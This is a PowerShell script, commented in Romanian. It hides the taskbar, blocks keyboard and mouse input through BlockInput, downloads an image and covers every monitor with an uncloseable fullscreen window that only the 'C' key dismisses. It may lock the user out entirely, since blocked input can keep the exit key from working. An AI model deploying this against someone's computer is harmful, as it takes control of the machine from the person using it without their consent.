Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Native {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Ascunde Taskbar
$taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
[Native]::ShowWindow($taskbar, 0)

# Blochează input
[Native]::BlockInput($true)

# Descarcă poza
$temp = "$env:TEMP\poza_laptop.jpg"
Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing

# Creează o singură fereastră care acoperă TOATE monitoarele
$bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }
$minX = ($bounds | ForEach-Object { $_.X }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
$minY = ($bounds | ForEach-Object { $_.Y }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
$maxRight = ($bounds | ForEach-Object { $_.Right }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
$maxBottom = ($bounds | ForEach-Object { $_.Bottom }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum

$width = $maxRight - $minX
$height = $maxBottom - $minY

# Variabilă globală
$script:inchis = $false

# Creează fereastra uriașă
$form = New-Object Windows.Forms.Form
$form.StartPosition = 'Manual'
$form.Location = New-Object Drawing.Point $minX, $minY
$form.Size = New-Object Drawing.Size $width, $height
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.ShowInTaskbar = $false
$form.BackColor = 'Black'
$form.KeyPreview = $true
$form.Cursor = [System.Windows.Forms.Cursors]::None

$img = [System.Drawing.Image]::FromFile($temp)
$pb = New-Object Windows.Forms.PictureBox
$pb.Image = $img
$pb.Dock = 'Fill'
$pb.SizeMode = 'Zoom'
$form.Controls.Add($pb)

# Eveniment tasta C
$form.Add_KeyDown({
    if ($_.KeyCode -eq 'C') {
        $script:inchis = $true
        $form.Close()
    }
})

# Protejează închiderea
$form.Add_FormClosing({
    if (-not $script:inchis) { $_.Cancel = $true }
})

# Afișează și pornește aplicația
$form.Show()
[System.Windows.Forms.Application]::Run($form)

# Deblochează după închidere
[Native]::BlockInput($false)
[Native]::ShowWindow($taskbar, 1)
